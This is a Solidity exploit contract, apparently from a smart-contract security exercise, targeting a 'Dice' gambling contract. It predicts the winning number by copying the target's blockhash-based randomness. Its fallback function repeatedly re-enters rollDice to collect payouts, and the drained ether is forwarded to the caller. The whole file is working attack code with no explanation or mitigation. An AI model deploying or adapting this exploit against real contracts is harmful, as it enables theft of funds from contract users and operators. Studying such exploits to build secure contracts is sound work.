// SPDX-License-Identifier: BEER-WARE
pragma solidity ^0.8.9;

import "../Dice.sol";
import "hardhat/console.sol";

contract DiceExploit2 {

  uint public wins;
  uint public constant entry = 0.1 ether;

  function getNumber() internal view returns (uint) {
    uint seed = uint(blockhash(block.number - 1)) % uint160(address(this));
    return seed % 100;
  }

  function pwn(Dice dice) public payable {

    require(msg.value == entry, "Invalid entry fee amount");
    uint number = getNumber();

    dice.register("pwner");
    dice.rollDice{value : entry}(number);

    uint balance = address(this).balance;
    (bool ok,) = msg.sender.call{value : balance}("");
    require(ok, "fail");
  }

  fallback() external payable {

    console.log('got payment!');
    uint balance = msg.sender.balance;

    if (++wins < 10 && balance >= 0.9 ether) {
      uint number = getNumber();
      Dice dice = Dice(msg.sender);
      dice.rollDice{value : entry}(number);
    }
  }

}
